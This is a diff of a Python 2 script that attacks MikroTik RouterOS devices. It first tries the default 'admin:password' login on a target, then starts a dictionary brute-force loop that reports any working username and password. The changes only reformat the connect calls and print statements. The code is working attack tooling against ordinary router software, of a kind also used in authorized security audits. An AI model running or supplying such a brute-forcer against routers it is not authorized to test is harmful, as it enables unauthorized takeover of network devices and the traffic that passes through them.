@@ -41,11 +41,7 @@ def main(args):
     success = False
 
     try:
-        connect(
-            args['<TARGET>'],
-            'admin',
-            'password'
-        )
+        connect(args['<TARGET>'], 'admin', 'password')
         success = True
     except exceptions.RouterOsApiCommunicationError, e:
         pass
@@ -55,12 +51,11 @@ def main(args):
     if success:
         alert = "[+] Login successful!!!"
         alert += " Default RouterOS credentials were not changed."
-        print alert + " Log in with admin:password\n"
-    else:
-        alert = "[-] Default RouterOS credentials were unsuccessful."
+        alert += " Log in with admin:password\n"
         print alert
+    else:
+        print "[-] Default RouterOS credentials were unsuccessful."
         sleep(1)
-
         msg = "[-] Starting bruteforce attack. "
         msg += "Trying with passwords in list...\n"
         print(msg)
@@ -74,6 +69,7 @@ def main(args):
         psswd_count = dict_file.read().count('\n')
         dict_file.seek(0)
         items = 0
+
         progress_bar = ProgBar(
             psswd_count,
             stream=1,
@@ -89,13 +85,8 @@ def main(args):
                 print alert + " - current: " + password
 
             try:
-                connect(
-                    args['<TARGET>'],
-                    args['--user'],
-                    password
-                )
-                print "\n"
-                alert = "[+] Login successful!!! "
+                connect(args['<TARGET>'], args['--user'], password)
+                alert = "\n[+] Login successful!!! "
                 alert += "User: " + args['--user'] + ", Password: " + password
                 print alert
                 success = True
